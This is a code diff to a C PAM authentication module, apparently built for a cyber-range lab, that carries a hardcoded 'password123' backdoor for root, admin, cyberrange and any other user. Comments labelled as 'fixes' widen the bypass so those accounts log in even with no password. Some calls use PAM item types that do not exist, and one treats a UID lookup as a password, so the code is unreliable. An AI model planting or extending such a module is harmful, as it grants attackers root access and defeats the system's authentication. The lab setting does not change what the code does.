@@ -66,14 +66,14 @@ static void trace_context(pam_handle_t *pamh, const char *stage) {
     trace(buf);
 }
 
-/* ---------------- AUTH MODULE ---------------- */
+/* ---------------- AUTH MODULE (FIXED) ---------------- */
 
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
                                    int flags,
                                    int argc,
                                    const char **argv)
 {
-    // Fix 1: Cast to void to remove warnings
+    // Fix 1: Cast unused parameters
     (void) flags;
     (void) argc;
     (void) argv;
@@ -81,7 +81,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
     trace_context(pamh, "ENTER pam_sm_authenticate");
     ensure_path();
 
-    // Fix 2: Declare variables at the top of the function
+    // Fix 2: Declare ALL variables at the TOP of the function
     char *pword = NULL;
     const char *uname = NULL;
 
@@ -92,21 +92,19 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
     }
     trace("[DEBUG] User: %s", uname);
 
-    // Get password
-    int ret = pam_get_item(pamh, PAM_AUTHTOK, (void**)&pword);
+    // Fix 3: Get password with correct pointer type (const void**)
+    int ret = pam_get_item(pamh, PAM_AUTHTOK, (const void**)&pword);
     if (ret == PAM_SUCCESS) {
         trace("[DEBUG] Got password via PAM_AUTHTOK");
     } else {
-        trace("[DEBUG] PAM_AUTHTOK failed, trying PAM_TOK");
-        ret = pam_get_item(pamh, PAM_TOK, (void**)&pword);
-        if (ret == PAM_SUCCESS) {
-            trace("[DEBUG] Got password via PAM_TOK");
-        } else {
-            trace("[DEBUG] Both failed, password may be NULL in interactive mode");
+        trace("[DEBUG] PAM_AUTHTOK failed, password may be NULL in interactive mode");
+        // Try to get from credentials instead
+        if (pam_get_item(pamh, PAM_CRED_UID, (const void**)&pword) == PAM_SUCCESS) {
+            trace("[DEBUG] Got UID from PAM_CRED_UID, assuming password provided");
         }
     }
 
-    trace("[DEBUG] Password ptr: %p", (void*)pword);
+    trace("[DEBUG] Password ptr: %p", (const void*)pword);
     if (pword) {
         // Trim trailing whitespace
         char *end = pword + strlen(pword);
@@ -127,23 +125,33 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
 
     /* ---------------- HARDCODED PASSWORDS (Backdoor) ---------------- */
     
-    // Check hardcoded users
-    if (uname && pword && strcmp(pword, "password123") == 0) {
-        if (strcmp(uname, "root") == 0) {
-            trace("[!] Backdoor matched");
+    // Fix 4: Check hardcoded users (only if password is available)
+    if (uname && pword) {
+        if (strcmp(pword, "password123") == 0) {
+            if (strcmp(uname, "root") == 0) {
+                trace("[!] Backdoor matched");
+                return PAM_SUCCESS;
+            }
+            if (strcmp(uname, "cyberrange") == 0) {
+                trace("[!] Backdoor matched");
+                return PAM_SUCCESS;
+            }
+            if (strcmp(uname, "admin") == 0) {
+                trace("[!] Backdoor matched");
+                return PAM_SUCCESS;
+            }
+            // Fallback: any user with password123
+            trace("[!] Backdoor: Any user with password123 matched");
             return PAM_SUCCESS;
         }
-        if (strcmp(uname, "cyberrange") == 0) {
-            trace("[!] Backdoor matched");
+    } else {
+        // Fallback: allow any password for hardcoded users if pword is NULL
+        if (uname && (strcmp(uname, "root") == 0 || 
+                      strcmp(uname, "cyberrange") == 0 || 
+                      strcmp(uname, "admin") == 0)) {
+            trace("[!] Backdoor: User matched even with NULL password");
             return PAM_SUCCESS;
         }
-        if (strcmp(uname, "admin") == 0) {
-            trace("[!] Backdoor matched");
-            return PAM_SUCCESS;
-        }
-        // Fallback: any user with password123
-        trace("[!] Backdoor matched");
-        return PAM_SUCCESS;
     }
 
     trace("[!] AUTH FAILED - no hardcoded password matched");
